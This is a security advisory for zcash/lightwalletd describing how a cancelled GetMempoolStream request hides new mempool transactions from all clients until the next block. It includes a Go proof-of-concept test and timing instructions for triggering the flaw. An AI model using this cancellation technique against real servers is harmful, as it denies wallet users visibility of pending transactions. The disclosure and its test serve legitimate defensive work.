# GHSA-pj5c-jx29-gmxr: A cancelled GetMempoolStream request hides new mempool transactions from every client until the next block

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-pj5c-jx29-gmxr |
| CVE | none assigned |
| Severity | medium |
| CWE | CWE-754 |
| Published | 2026-11-18T00:38:24Z |
| Updated | 2026-11-18T00:38:24Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-pj5c-jx29-gmxr |

## Description (verbatim)

### Summary

lightwalletd's shared mempool refresh runs under the gRPC stream context of whichever client first triggers it, and it marks each new txid "seen" before it fetches the transaction. If that client cancels mid-refresh, the in-flight getrawtransaction calls fail on the cancelled context and the error is swallowed, but the txids stay in the "seen" set — which is only cleared on a new block. So those transactions are never fetched again this block interval and never reach the shared list that every GetMempoolStream client reads. One client (malicious or just unlucky with timing) can therefore blank out pending-incoming transactions for all stream subscribers until the next block. No funds are at risk; this is a mempool visibility / 0-conf UX issue. 0.5.2 fixed exactly this class for GetMempoolTx but left GetMempoolStream / common.GetMempool unfixed.


### Details

In common/mempool.go, the first GetMempool caller that finds the 2-second cache stale runs refreshMempoolTxns(ctx) with its own gRPC stream context (L56-75; ctx is threaded from frontend/service.go:686). For each new txid, the txid is inserted into the shared g_txidSeen set before the fetch:

    common/mempool.go:124-125   // marks seen, then fetches
    common/mempool.go:132       result, rpcErr := RawRequest(ctx, "getrawtransaction", params)

RawRequest returns immediately on a cancelled ctx (frontend/rawrequest.go:111-113), and the error is swallowed as "mempool transactions can disappear" (L133-135, continue). g_txidSeen is cleared only on a new tip (L62-69), so a txid marked seen but not fetched is never retried this block interval and never appended to the shared g_txList that all GetMempoolStream clients read.

This was introduced by commit 98f38ef (2026-06-10, "make RawRequest context-aware"), shipped in v0.5.0. v0.5.2 fixed this exact pattern for GetMempoolTx ("A GetMempoolTx refresh now stops when the client that triggered it disconnects...") but the GetMempoolStream / common.GetMempool path still runs the refresh under the caller's cancellable context, so it is the remaining unfixed sibling of that class.

Reachability: GetMempoolStream is an unauthenticated, default-enabled method. An attacker opens it and cancels (RST_STREAM, or a few-millisecond grpc-timeout) so the cancellation lands after getrawmempool returns and while a getrawtransaction is in flight; each RawRequest uses a fresh TCP connection with Close=true, so the window is milliseconds per new tx and recurs every 2 seconds. An honest mobile client that drops at that instant triggers the same loss.

A fix: run the refresh under a server-owned context (as 0.5.2 did for GetMempoolTx), or only mark a txid seen after a successful fetch / abort the whole refresh on ctx.Err().

### Proof of concept

Tested against lightwalletd master (d16d481); the code is identical on tags v0.5.0 through v0.5.4.

1. Copy the file below to lightwalletd/common/lwd_mempool_stream_drop_test.go
2. go test ./common/ -run TestPoCMempoolStream -v -count=1

Observed (3 consecutive identical runs):

    attacker GetMempool returned: context canceled
    after attacker: g_txidSeen=[victimtxid], len(g_txList)=0
    honest GetMempool returned: context deadline exceeded; transactions delivered: 0; backend getrawtransaction calls: 1
    RESULT: victimtxid is in the backend mempool but is hidden from every GetMempoolStream client until the next block
    --- PASS: TestPoCMempoolStreamCancelDropsTx (3.00s)
    control: honest wallet received 1 transaction(s)
    --- PASS: TestPoCMempoolStreamControlNoCancel (3.30s)

A/B control: TestPoCMempoolStreamControlNoCancel runs the same sequence without the mid-refresh cancellation and the honest wallet receives the transaction normally — so the cancellation is what causes the loss.

----- BEGIN test file: lightwalletd/common/lwd_mempool_stream_drop_test.go -----
// PoC (Specialist D, local only). Copy into lightwalletd/common/ and run:
//
//  go test ./common/ -run TestPoCMempoolStreamCancelDropsTx -v -count=1
//
// A GetMempoolStream caller whose request context is cancelled while it is the
// goroutine refreshing the shared mempool cache (refreshMempoolTxns, called with
// the *caller's* ctx since 98f38ef) makes every not-yet-fetched new txid be
// recorded in g_txidSeen and skipped ("mempool transactions can disappear").
// Those transactions are then never delivered to ANY GetMempoolStream client
// until the next block clears g_txidSeen. Same defect class that 0.5.2 fixed for
// GetMempoolTx ("a refresh now stops when the client that triggered it
// disconnects ..."), left unfixed in common/mempool.go.
package common

import (
    "context"
    "encoding/json"
    "errors"
    "sync/atomic"
    "testing"
    "time"

    "github.com/zcash/lightwalletd/walletrpc"
)

func TestPoCMempoolStreamCancelDropsTx(t *testing.T) {
    defer resetGlobals()
    Time.Sleep = time.Sleep
    Time.Now = time.Now
    Time.After = time.After

    // Simulated backend (zebrad): stable tip, mempool holds one victim tx.
    // Like the production context-aware RawRequest (frontend/rawrequest.go,
    // http.NewRequestWithContext), a call made with a cancelled ctx fails.
    attackerCtx, cancelAttacker := context.WithCancel(context.Background())
    var victimFetches int32
    RawRequest = func(ctx context.Context, method string, params []json.RawMessage) (json.RawMessage, error) {
        switch method {
        case "getblockchaininfo":
            r, _ := json.Marshal(&ZcashdRpcReplyGetblockchaininfo{BestBlockHash: "tip-A", Blocks: 100})
            return r, nil
        case "getrawmempool":
            if err := ctx.Err(); err != nil {
                return nil, err
            }
            return json.RawMessage(`["victimtxid"]`), nil
        case "getrawtransaction":
            atomic.AddInt32(&victimFetches, 1)
            if ctx == attackerCtx {
                // The attacker's stream is reset (or its grpc-timeout expires)
                // while this backend call is in flight.
                cancelAttacker()
            }
            if err := ctx.Err(); err != nil {
                return nil, err
            }
            r, _ := json.Marshal(map[string]string{"hex": "aabb"})
            return r, nil
        }
        return nil, errors.New("unexpected RPC " + method)
    }

    g_lastBlockChainInfo = &ZcashdRpcReplyGetblockchaininfo{BestBlockHash: "tip-A"}
    g_lastTime = time.Time{}
    g_txidSeen = map[txid]struct{}{}
    g_txList = []*walletrpc.RawTransaction{}

    // 1. Attacker: GetMempoolStream, cancelled mid-refresh.
    err := GetMempool(attackerCtx, func(*walletrpc.RawTransaction) error { return nil })
    t.Logf("attacker GetMempool returned: %v", err)
    t.Logf("after attacker: g_txidSeen=%v, len(g_txList)=%d", keys(g_txidSeen), len(g_txList))

    // 2. Honest wallet: GetMempoolStream for 3 s (several refreshes), same block.
    honestCtx, cancelHonest := context.WithTimeout(context.Background(), 3*time.Second)
    defer cancelHonest()
    var got []*walletrpc.RawTransaction
    err = GetMempool(honestCtx, func(tx *walletrpc.RawTransaction) error {
        got = append(got, tx)
        return nil
    })
    t.Logf("honest GetMempool returned: %v; transactions delivered: %d; backend getrawtransaction calls: %d",
        err, len(got), atomic.LoadInt32(&victimFetches))

    if len(got) != 0 {
        t.Fatalf("victim tx was delivered; defect not reproduced")
    }
    t.Logf("RESULT: victimtxid is in the backend mempool but is hidden from every GetMempoolStream client until the next block")
}

func keys(m map[txid]struct{}) []string {
    var out []string
    for k := range m {
        out = append(out, string(k))
    }
    return out
}

// Control: identical backend and timeline, but the first caller is not
// cancelled. The honest wallet then receives the transaction.
func TestPoCMempoolStreamControlNoCancel(t *testing.T) {
    defer resetGlobals()
    Time.Sleep = time.Sleep
    Time.Now = time.Now
    Time.After = time.After
    RawRequest = func(ctx context.Context, method string, params []json.RawMessage) (json.RawMessage, error) {
        if err := ctx.Err(); err != nil {
            return nil, err
        }
        switch method {
        case "getblockchaininfo":
            r, _ := json.Marshal(&ZcashdRpcReplyGetblockchaininfo{BestBlockHash: "tip-A", Blocks: 100})
            return r, nil
        case "getrawmempool":
            return json.RawMessage(`["victimtxid"]`), nil
        case "getrawtransaction":
            r, _ := json.Marshal(map[string]string{"hex": "aabb"})
            return r, nil
        }
        return nil, errors.New("unexpected RPC " + method)
    }
    g_lastBlockChainInfo = &ZcashdRpcReplyGetblockchaininfo{BestBlockHash: "tip-A"}
    g_lastTime = time.Time{}
    g_txidSeen = map[txid]struct{}{}
    g_txList = []*walletrpc.RawTransaction{}

    firstCtx, cancelFirst := context.WithTimeout(context.Background(), 300*time.Millisecond)
    defer cancelFirst()
    _ = GetMempool(firstCtx, func(*walletrpc.RawTransaction) error { return nil })

    honestCtx, cancelHonest := context.WithTimeout(context.Background(), 3*time.Second)
    defer cancelHonest()
    var got []*walletrpc.RawTransaction
    _ = GetMempool(honestCtx, func(tx *walletrpc.RawTransaction) error {
        got = append(got, tx)
        return nil
    })
    t.Logf("control: honest wallet received %d transaction(s)", len(got))
    if len(got) != 1 {
        t.Fatalf("control expected 1 tx, got %d", len(got))
    }
}

----- END test file -----



### Impact

Pending (unconfirmed) transactions become invisible to all GetMempoolStream subscribers — the wallet "incoming" / 0-conf display and the mempool-privacy signal — until those transactions are mined. No funds are lost and mined transactions are still found by block scanning, so this is a low-severity visibility and liveness issue; it is timing-dependent but cheap to retry every 2 seconds.

